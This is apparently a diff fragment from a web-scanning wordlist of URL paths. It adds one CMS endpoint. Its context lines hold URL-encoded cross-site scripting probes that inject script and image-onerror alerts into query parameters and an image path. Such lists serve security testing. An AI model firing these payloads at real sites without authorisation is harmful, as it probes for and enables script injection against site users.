@@ -710,3 +710,4 @@
 /share/api/images/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/filename
 /index_en.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /index.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/cms/collect/getArticle
